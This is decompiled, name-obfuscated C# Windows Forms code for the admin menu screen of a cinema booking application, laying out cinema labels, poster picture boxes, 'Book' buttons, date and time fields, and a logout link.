using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Hr4g;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using f4L;

namespace e9QR;

[DesignerGenerated]
public class Gz39 : Form
{
	private IContainer components;

	private Label _Label14;

	private Label _Label12;

	private Label _Label10;

	private Label _Label9;

	private PictureBox _PictureBox21;

	private PictureBox _PictureBox17;

	private PictureBox _PictureBox16;

	private PictureBox _PictureBox15;

	private PictureBox _PictureBox13;

	private PictureBox _PictureBox11;

	private PictureBox _PictureBox10;

	private Label _Label5;

	private PictureBox _PictureBox7;

	private PictureBox _PictureBox6;

	private Label _lblTime;

	private Label _lblDate;

	private Label _Label1;

	private PictureBox _PictureBox5;

	private Button _btnCinema1;

	private Button _btnCinema4;

	private Button _btnCinema3;

	private Button _Button14;

	internal Label S;

	internal Label A;

	internal Label v;

	internal Label I;

	internal PictureBox m;

	internal PictureBox F;

	internal PictureBox W;

	internal PictureBox R;

	internal PictureBox y;

	internal Label k;

	internal PictureBox X;

	internal Label G;

	internal PictureBox l;

	internal Label h;

	internal Timer q;

	internal PictureBox t;

	internal Button c;

	internal LinkLabel P;

	internal PictureBox J;

	public Gz39()
	{
		((Form)this).add_Load((EventHandler)w5JP);
		Fo7g();
	}

	protected override void y9B0(bool Rn16)
	{
		try
		{
			if (Rn16 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Rn16);
		}
	}

	private void Fo7g()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_02da: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e4: Expected O, but got Unknown
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0378: Expected O, but got Unknown
		//IL_0402: Unknown result type (might be due to invalid IL or missing references)
		//IL_040c: Expected O, but got Unknown
		//IL_0496: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a0: Expected O, but got Unknown
		//IL_052a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0534: Expected O, but got Unknown
		//IL_05c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cf: Expected O, but got Unknown
		//IL_0660: Unknown result type (might be due to invalid IL or missing references)
		//IL_066a: Expected O, but got Unknown
		//IL_06fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0705: Expected O, but got Unknown
		//IL_0cc1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccb: Expected O, but got Unknown
		//IL_0dc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd2: Expected O, but got Unknown
		//IL_0ff7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1001: Expected O, but got Unknown
		//IL_1098: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a2: Expected O, but got Unknown
		//IL_19a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_19b3: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Gz39));
		Ex62(new Label());
		Mn2k(new Label());
		y4R6(new Label());
		Zd1f(new Label());
		f1W8(new Label());
		Es3i(new Label());
		Kn24(new Label());
		Fo41(new Label());
		s1RH(new PictureBox());
		z3C9(new PictureBox());
		Py6x(new PictureBox());
		i9FA(new PictureBox());
		x3WE(new PictureBox());
		p3XR(new PictureBox());
		Az69(new PictureBox());
		Cx50(new PictureBox());
		e8PQ(new PictureBox());
		k5Q9(new PictureBox());
		d0YP(new PictureBox());
		Lp4d(new PictureBox());
		Ra18(new Label());
		Lk80(new PictureBox());
		Aw21(new Label());
		m8TF(new Label());
		b1WD(new PictureBox());
		Kn0x(new PictureBox());
		y4JB(new PictureBox());
		Nt35(new Label());
		z4N9(new Label());
		t0N1(new Label());
		g0GN(new Label());
		n4BA(new PictureBox());
		Ep8a(new Timer(components));
		f5TQ(new PictureBox());
		f8JY(new Button());
		a2Y5(new Button());
		Bt49(new Button());
		Gm8a(new Button());
		Et89(new Button());
		n0WC(new LinkLabel());
		r2Y5(new PictureBox());
		((ISupportInitialize)c6RD()).BeginInit();
		((ISupportInitialize)f6JH()).BeginInit();
		((ISupportInitialize)y6EY()).BeginInit();
		((ISupportInitialize)Wx24()).BeginInit();
		((ISupportInitialize)n2XQ()).BeginInit();
		((ISupportInitialize)f3E0()).BeginInit();
		((ISupportInitialize)n1FC()).BeginInit();
		((ISupportInitialize)w1LP()).BeginInit();
		((ISupportInitialize)e0AJ()).BeginInit();
		((ISupportInitialize)Ma68()).BeginInit();
		((ISupportInitialize)Wo80()).BeginInit();
		((ISupportInitialize)d2L4()).BeginInit();
		((ISupportInitialize)Ls9d()).BeginInit();
		((ISupportInitialize)m8KG()).BeginInit();
		((ISupportInitialize)Mx51()).BeginInit();
		((ISupportInitialize)Fc02()).BeginInit();
		((ISupportInitialize)Nq5a()).BeginInit();
		((ISupportInitialize)Bc34()).BeginInit();
		((ISupportInitialize)y4XS()).BeginInit();
		((Control)this).SuspendLayout();
		Kp09().set_AutoSize(true);
		((Control)Kp09()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Kp09()).set_ForeColor(SystemColors.ControlLight);
		((Control)Kp09()).set_Location(new Point(329, 446));
		((Control)Kp09()).set_Name("Label14");
		((Control)Kp09()).set_Size(new Size(71, 15));
		((Control)Kp09()).set_TabIndex(88);
		Kp09().set_Text("CINEMA 2");
		Tm9q().set_AutoSize(true);
		((Control)Tm9q()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Tm9q()).set_ForeColor(SystemColors.ControlLight);
		((Control)Tm9q()).set_Location(new Point(491, 446));
		((Control)Tm9q()).set_Name("Label13");
		((Control)Tm9q()).set_Size(new Size(71, 15));
		((Control)Tm9q()).set_TabIndex(87);
		Tm9q().set_Text("CINEMA 3");
		o4D9().set_AutoSize(true);
		((Control)o4D9()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)o4D9()).set_ForeColor(SystemColors.ControlLight);
		((Control)o4D9()).set_Location(new Point(640, 446));
		((Control)o4D9()).set_Name("Label12");
		((Control)o4D9()).set_Size(new Size(71, 15));
		((Control)o4D9()).set_TabIndex(86);
		o4D9().set_Text("CINEMA 4");
		p3Z6().set_AutoSize(true);
		((Control)p3Z6()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)p3Z6()).set_ForeColor(SystemColors.ControlLight);
		((Control)p3Z6()).set_Location(new Point(178, 446));
		((Control)p3Z6()).set_Name("Label11");
		((Control)p3Z6()).set_Size(new Size(71, 15));
		((Control)p3Z6()).set_TabIndex(85);
		p3Z6().set_Text("CINEMA 1");
		o5EY().set_AutoSize(true);
		((Control)o5EY()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)o5EY()).set_ForeColor(Color.FromArgb(0, 0, 64));
		((Control)o5EY()).set_Location(new Point(323, 420));
		((Control)o5EY()).set_Name("Label10");
		((Control)o5EY()).set_Size(new Size(132, 15));
		((Control)o5EY()).set_TabIndex(84);
		o5EY().set_Text("NOW SHOWING ON");
		z9R3().set_AutoSize(true);
		((Control)z9R3()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)z9R3()).set_ForeColor(Color.FromArgb(0, 0, 64));
		((Control)z9R3()).set_Location(new Point(478, 420));
		((Control)z9R3()).set_Name("Label9");
		((Control)z9R3()).set_Size(new Size(132, 15));
		((Control)z9R3()).set_TabIndex(83);
		z9R3().set_Text("NOW SHOWING ON");
		t3RA().set_AutoSize(true);
		((Control)t3RA()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)t3RA()).set_ForeColor(Color.FromArgb(0, 0, 64));
		((Control)t3RA()).set_Location(new Point(640, 420));
		((Control)t3RA()).set_Name("Label8");
		((Control)t3RA()).set_Size(new Size(132, 15));
		((Control)t3RA()).set_TabIndex(82);
		t3RA().set_Text("NOW SHOWING ON");
		r5YW().set_AutoSize(true);
		((Control)r5YW()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)r5YW()).set_ForeColor(Color.FromArgb(0, 0, 64));
		((Control)r5YW()).set_Location(new Point(181, 420));
		((Control)r5YW()).set_Name("Label7");
		((Control)r5YW()).set_Size(new Size(132, 15));
		((Control)r5YW()).set_TabIndex(81);
		r5YW().set_Text("NOW SHOWING ON");
		((Control)c6RD()).set_BackColor(Color.Transparent);
		((Control)c6RD()).set_Location(new Point(323, 415));
		((Control)c6RD()).set_Name("PictureBox22");
		((Control)c6RD()).set_Size(new Size(149, 73));
		c6RD().set_TabIndex(80);
		c6RD().set_TabStop(false);
		((Control)f6JH()).set_BackColor(Color.Transparent);
		((Control)f6JH()).set_Location(new Point(478, 415));
		((Control)f6JH()).set_Name("PictureBox21");
		((Control)f6JH()).set_Size(new Size(141, 73));
		f6JH().set_TabIndex(79);
		f6JH().set_TabStop(false);
		((Control)y6EY()).set_BackColor(Color.Transparent);
		((Control)y6EY()).set_Location(new Point(625, 415));
		((Control)y6EY()).set_Name("PictureBox20");
		((Control)y6EY()).set_Size(new Size(147, 73));
		y6EY().set_TabIndex(78);
		y6EY().set_TabStop(false);
		((Control)Wx24()).set_BackColor(Color.Transparent);
		((Control)Wx24()).set_Location(new Point(177, 415));
		((Control)Wx24()).set_Name("PictureBox18");
		((Control)Wx24()).set_Size(new Size(140, 73));
		Wx24().set_TabIndex(77);
		Wx24().set_TabStop(false);
		((Control)n2XQ()).set_BackColor(Color.Transparent);
		((Control)n2XQ()).set_Location(new Point(634, 124));
		((Control)n2XQ()).set_Name("PictureBox17");
		((Control)n2XQ()).set_Size(new Size(129, 224));
		n2XQ().set_SizeMode((PictureBoxSizeMode)1);
		n2XQ().set_TabIndex(72);
		n2XQ().set_TabStop(false);
		((Control)f3E0()).set_BackColor(Color.Transparent);
		((Control)f3E0()).set_Location(new Point(485, 124));
		((Control)f3E0()).set_Name("PictureBox16");
		((Control)f3E0()).set_Size(new Size(129, 224));
		f3E0().set_SizeMode((PictureBoxSizeMode)1);
		f3E0().set_TabIndex(71);
		f3E0().set_TabStop(false);
		((Control)n1FC()).set_BackColor(Color.Transparent);
		((Control)n1FC()).set_Location(new Point(332, 125));
		((Control)n1FC()).set_Name("PictureBox15");
		((Control)n1FC()).set_Size(new Size(129, 224));
		n1FC().set_SizeMode((PictureBoxSizeMode)1);
		n1FC().set_TabIndex(70);
		n1FC().set_TabStop(false);
		((Control)w1LP()).set_BackColor(Color.Transparent);
		((Control)w1LP()).set_Location(new Point(181, 128));
		((Control)w1LP()).set_Name("PictureBox14");
		((Control)w1LP()).set_Size(new Size(129, 224));
		w1LP().set_SizeMode((PictureBoxSizeMode)1);
		w1LP().set_TabIndex(69);
		w1LP().set_TabStop(false);
		((Control)e0AJ()).set_BackColor(Color.Transparent);
		((Control)e0AJ()).set_Location(new Point(477, 118));
		((Control)e0AJ()).set_Name("PictureBox13");
		((Control)e0AJ()).set_Size(new Size(142, 297));
		e0AJ().set_TabIndex(68);
		e0AJ().set_TabStop(false);
		((Control)Ma68()).set_BackColor(Color.Transparent);
		((Control)Ma68()).set_Location(new Point(174, 121));
		((Control)Ma68()).set_Name("PictureBox12");
		((Control)Ma68()).set_Size(new Size(143, 294));
		Ma68().set_TabIndex(67);
		Ma68().set_TabStop(false);
		((Control)Wo80()).set_BackColor(Color.Transparent);
		((Control)Wo80()).set_Location(new Point(623, 117));
		((Control)Wo80()).set_Name("PictureBox11");
		((Control)Wo80()).set_Size(new Size(149, 298));
		Wo80().set_TabIndex(66);
		Wo80().set_TabStop(false);
		((Control)d2L4()).set_BackColor(Color.Transparent);
		((Control)d2L4()).set_Location(new Point(323, 119));
		((Control)d2L4()).set_Name("PictureBox10");
		((Control)d2L4()).set_Size(new Size(149, 296));
		d2L4().set_TabIndex(65);
		d2L4().set_TabStop(false);
		Nz82().set_AutoSize(true);
		((Control)Nz82()).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Nz82()).set_ForeColor(SystemColors.ControlLight);
		((Control)Nz82()).set_Location(new Point(189, 78));
		((Control)Nz82()).set_Name("Label6");
		((Control)Nz82()).set_Size(new Size(230, 24));
		((Control)Nz82()).set_TabIndex(64);
		Nz82().set_Text("MOVIES ON SHOWING");
		((Control)Ls9d()).set_BackColor(Color.Transparent);
		((Control)Ls9d()).set_Location(new Point(174, 65));
		((Control)Ls9d()).set_Name("PictureBox9");
		((Control)Ls9d()).set_Size(new Size(607, 50));
		Ls9d().set_SizeMode((PictureBoxSizeMode)1);
		Ls9d().set_TabIndex(63);
		Ls9d().set_TabStop(false);
		f3RG().set_AutoSize(true);
		((Control)f3RG()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)f3RG()).set_Location(new Point(165, 14));
		((Control)f3RG()).set_Name("Label5");
		((Control)f3RG()).set_Size(new Size(41, 13));
		((Control)f3RG()).set_TabIndex(62);
		f3RG().set_Text("Admin");
		x8E9().set_AutoSize(true);
		((Control)x8E9()).set_Location(new Point(96, 14));
		((Control)x8E9()).set_Name("Label3");
		((Control)x8E9()).set_Size(new Size(75, 13));
		((Control)x8E9()).set_TabIndex(60);
		x8E9().set_Text("Current User : ");
		((Control)m8KG()).set_BackColor(Color.Transparent);
		((Control)m8KG()).set_Location(new Point(15, 7));
		((Control)m8KG()).set_Name("PictureBox8");
		((Control)m8KG()).set_Size(new Size(51, 47));
		m8KG().set_SizeMode((PictureBoxSizeMode)4);
		m8KG().set_TabIndex(59);
		m8KG().set_TabStop(false);
		((Control)Mx51()).set_BackColor(Color.Transparent);
		((Control)Mx51()).set_Location(new Point(11, 6));
		((Control)Mx51()).set_Name("PictureBox7");
		((Control)Mx51()).set_Size(new Size(223, 50));
		Mx51().set_TabIndex(58);
		Mx51().set_TabStop(false);
		((Control)Fc02()).set_BackColor(Color.Transparent);
		((Control)Fc02()).set_Location(new Point(-1, -1));
		((Control)Fc02()).set_Name("PictureBox6");
		((Control)Fc02()).set_Size(new Size(615, 63));
		Fc02().set_SizeMode((PictureBoxSizeMode)1);
		Fc02().set_TabIndex(57);
		Fc02().set_TabStop(false);
		a4QT().set_AutoSize(true);
		((Control)a4QT()).set_BackColor(Color.Transparent);
		((Control)a4QT()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)a4QT()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)a4QT()).set_Location(new Point(87, 133));
		((Control)a4QT()).set_Name("lblTime");
		((Control)a4QT()).set_Size(new Size(39, 13));
		((Control)a4QT()).set_TabIndex(56);
		a4QT().set_Text("Label4");
		t1E4().set_AutoSize(true);
		((Control)t1E4()).set_BackColor(Color.Transparent);
		((Control)t1E4()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)t1E4()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)t1E4()).set_Location(new Point(87, 101));
		((Control)t1E4()).set_Name("lblDate");
		((Control)t1E4()).set_Size(new Size(39, 13));
		((Control)t1E4()).set_TabIndex(55);
		t1E4().set_Text("Label3");
		Pi43().set_AutoSize(true);
		((Control)Pi43()).set_BackColor(Color.Transparent);
		((Control)Pi43()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Pi43()).set_Location(new Point(30, 133));
		((Control)Pi43()).set_Name("Label2");
		((Control)Pi43()).set_Size(new Size(36, 13));
		((Control)Pi43()).set_TabIndex(54);
		Pi43().set_Text("Time :");
		Pz4c().set_AutoSize(true);
		((Control)Pz4c()).set_BackColor(Color.Transparent);
		((Control)Pz4c()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Pz4c()).set_Location(new Point(30, 101));
		((Control)Pz4c()).set_Name("Label1");
		((Control)Pz4c()).set_Size(new Size(36, 13));
		((Control)Pz4c()).set_TabIndex(53);
		Pz4c().set_Text("Date :");
		((Control)Nq5a()).set_BackColor(Color.Transparent);
		((Control)Nq5a()).set_Location(new Point(-1, 68));
		((Control)Nq5a()).set_Name("PictureBox5");
		((Control)Nq5a()).set_Size(new Size(172, 114));
		Nq5a().set_SizeMode((PictureBoxSizeMode)1);
		Nq5a().set_TabIndex(52);
		Nq5a().set_TabStop(false);
		((Control)Bc34()).set_BackColor(Color.Transparent);
		((Control)Bc34()).set_Location(new Point(-1, 392));
		((Control)Bc34()).set_Name("PictureBox1");
		((Control)Bc34()).set_Size(new Size(172, 141));
		Bc34().set_SizeMode((PictureBoxSizeMode)4);
		Bc34().set_TabIndex(45);
		Bc34().set_TabStop(false);
		((ButtonBase)Da06()).set_BackColor(Color.Transparent);
		((ButtonBase)Da06()).set_FlatStyle((FlatStyle)1);
		((Control)Da06()).set_ForeColor(SystemColors.ControlLight);
		((Control)Da06()).set_Location(new Point(258, 444));
		((Control)Da06()).set_Name("btnCinema1");
		((Control)Da06()).set_Size(new Size(55, 23));
		((Control)Da06()).set_TabIndex(89);
		((ButtonBase)Da06()).set_Text("Book");
		((ButtonBase)Da06()).set_UseVisualStyleBackColor(false);
		((ButtonBase)x1QH()).set_BackColor(Color.Transparent);
		((ButtonBase)x1QH()).set_FlatStyle((FlatStyle)1);
		((Control)x1QH()).set_ForeColor(SystemColors.ControlLight);
		((Control)x1QH()).set_Location(new Point(717, 444));
		((Control)x1QH()).set_Name("btnCinema4");
		((Control)x1QH()).set_Size(new Size(46, 23));
		((Control)x1QH()).set_TabIndex(92);
		((ButtonBase)x1QH()).set_Text("Book");
		((ButtonBase)x1QH()).set_UseVisualStyleBackColor(false);
		((ButtonBase)y9NT()).set_BackColor(Color.Transparent);
		((ButtonBase)y9NT()).set_FlatStyle((FlatStyle)1);
		((Control)y9NT()).set_ForeColor(SystemColors.ControlLight);
		((Control)y9NT()).set_Location(new Point(414, 443));
		((Control)y9NT()).set_Name("btnCinema2");
		((Control)y9NT()).set_Size(new Size(47, 23));
		((Control)y9NT()).set_TabIndex(92);
		((ButtonBase)y9NT()).set_Text("Book");
		((ButtonBase)y9NT()).set_UseVisualStyleBackColor(false);
		((ButtonBase)Zk79()).set_BackColor(Color.Transparent);
		((ButtonBase)Zk79()).set_FlatStyle((FlatStyle)1);
		((Control)Zk79()).set_ForeColor(SystemColors.ControlLight);
		((Control)Zk79()).set_Location(new Point(568, 442));
		((Control)Zk79()).set_Name("btnCinema3");
		((Control)Zk79()).set_Size(new Size(47, 23));
		((Control)Zk79()).set_TabIndex(92);
		((ButtonBase)Zk79()).set_Text("Book");
		((ButtonBase)Zk79()).set_UseVisualStyleBackColor(false);
		((ButtonBase)n0XP()).set_BackColor(Color.Transparent);
		((ButtonBase)n0XP()).set_FlatStyle((FlatStyle)1);
		((Control)n0XP()).set_ForeColor(SystemColors.ControlLight);
		((Control)n0XP()).set_Location(new Point(594, 633));
		((Control)n0XP()).set_Name("Button14");
		((Control)n0XP()).set_Size(new Size(58, 23));
		((Control)n0XP()).set_TabIndex(92);
		((ButtonBase)n0XP()).set_Text("Book");
		((ButtonBase)n0XP()).set_UseVisualStyleBackColor(false);
		((Label)n7N1()).set_AutoSize(true);
		((Control)n7N1()).set_BackColor(Color.Transparent);
		n7N1().set_LinkColor(Color.White);
		((Control)n7N1()).set_Location(new Point(679, 40));
		((Control)n7N1()).set_Name("linklogout");
		((Control)n7N1()).set_Size(new Size(40, 13));
		((Control)n7N1()).set_TabIndex(93);
		n7N1().set_TabStop(true);
		n7N1().set_Text("Logout");
		((Control)y4XS()).set_Location(new Point(-1, 188));
		((Control)y4XS()).set_Name("PictureBox19");
		((Control)y4XS()).set_Size(new Size(172, 198));
		y4XS().set_SizeMode((PictureBoxSizeMode)1);
		y4XS().set_TabIndex(94);
		y4XS().set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(780, 533));
		((Control)this).get_Controls().Add((Control)(object)y4XS());
		((Control)this).get_Controls().Add((Control)(object)n7N1());
		((Control)this).get_Controls().Add((Control)(object)n0XP());
		((Control)this).get_Controls().Add((Control)(object)Zk79());
		((Control)this).get_Controls().Add((Control)(object)y9NT());
		((Control)this).get_Controls().Add((Control)(object)x1QH());
		((Control)this).get_Controls().Add((Control)(object)Da06());
		((Control)this).get_Controls().Add((Control)(object)Kp09());
		((Control)this).get_Controls().Add((Control)(object)Tm9q());
		((Control)this).get_Controls().Add((Control)(object)o4D9());
		((Control)this).get_Controls().Add((Control)(object)p3Z6());
		((Control)this).get_Controls().Add((Control)(object)o5EY());
		((Control)this).get_Controls().Add((Control)(object)z9R3());
		((Control)this).get_Controls().Add((Control)(object)t3RA());
		((Control)this).get_Controls().Add((Control)(object)r5YW());
		((Control)this).get_Controls().Add((Control)(object)c6RD());
		((Control)this).get_Controls().Add((Control)(object)f6JH());
		((Control)this).get_Controls().Add((Control)(object)y6EY());
		((Control)this).get_Controls().Add((Control)(object)Wx24());
		((Control)this).get_Controls().Add((Control)(object)n2XQ());
		((Control)this).get_Controls().Add((Control)(object)f3E0());
		((Control)this).get_Controls().Add((Control)(object)n1FC());
		((Control)this).get_Controls().Add((Control)(object)w1LP());
		((Control)this).get_Controls().Add((Control)(object)e0AJ());
		((Control)this).get_Controls().Add((Control)(object)Ma68());
		((Control)this).get_Controls().Add((Control)(object)Wo80());
		((Control)this).get_Controls().Add((Control)(object)d2L4());
		((Control)this).get_Controls().Add((Control)(object)Nz82());
		((Control)this).get_Controls().Add((Control)(object)Ls9d());
		((Control)this).get_Controls().Add((Control)(object)f3RG());
		((Control)this).get_Controls().Add((Control)(object)x8E9());
		((Control)this).get_Controls().Add((Control)(object)m8KG());
		((Control)this).get_Controls().Add((Control)(object)Mx51());
		((Control)this).get_Controls().Add((Control)(object)Fc02());
		((Control)this).get_Controls().Add((Control)(object)a4QT());
		((Control)this).get_Controls().Add((Control)(object)t1E4());
		((Control)this).get_Controls().Add((Control)(object)Pi43());
		((Control)this).get_Controls().Add((Control)(object)Pz4c());
		((Control)this).get_Controls().Add((Control)(object)Nq5a());
		((Control)this).get_Controls().Add((Control)(object)Bc34());
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Menu_Admin");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("MENU");
		((ISupportInitialize)c6RD()).EndInit();
		((ISupportInitialize)f6JH()).EndInit();
		((ISupportInitialize)y6EY()).EndInit();
		((ISupportInitialize)Wx24()).EndInit();
		((ISupportInitialize)n2XQ()).EndInit();
		((ISupportInitialize)f3E0()).EndInit();
		((ISupportInitialize)n1FC()).EndInit();
		((ISupportInitialize)w1LP()).EndInit();
		((ISupportInitialize)e0AJ()).EndInit();
		((ISupportInitialize)Ma68()).EndInit();
		((ISupportInitialize)Wo80()).EndInit();
		((ISupportInitialize)d2L4()).EndInit();
		((ISupportInitialize)Ls9d()).EndInit();
		((ISupportInitialize)m8KG()).EndInit();
		((ISupportInitialize)Mx51()).EndInit();
		((ISupportInitialize)Fc02()).EndInit();
		((ISupportInitialize)Nq5a()).EndInit();
		((ISupportInitialize)Bc34()).EndInit();
		((ISupportInitialize)y4XS()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label Kp09()
	{
		return _Label14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ex62(Label s1D4)
	{
		_Label14 = s1D4;
	}

	[SpecialName]
	internal virtual Label Tm9q()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mn2k(Label o3LE)
	{
		Label val = (S = o3LE);
	}

	[SpecialName]
	internal virtual Label o4D9()
	{
		return _Label12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y4R6(Label z4XF)
	{
		_Label12 = z4XF;
	}

	[SpecialName]
	internal virtual Label p3Z6()
	{
		return A;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zd1f(Label n1FR)
	{
		Label val = (A = n1FR);
	}

	[SpecialName]
	internal virtual Label o5EY()
	{
		return _Label10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f1W8(Label Zc21)
	{
		_Label10 = Zc21;
	}

	[SpecialName]
	internal virtual Label z9R3()
	{
		return _Label9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Es3i(Label y0E9)
	{
		_Label9 = y0E9;
	}

	[SpecialName]
	internal virtual Label t3RA()
	{
		return v;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kn24(Label Pc34)
	{
		Label val = (v = Pc34);
	}

	[SpecialName]
	internal virtual Label r5YW()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fo41(Label x0AH)
	{
		Label val = (I = x0AH);
	}

	[SpecialName]
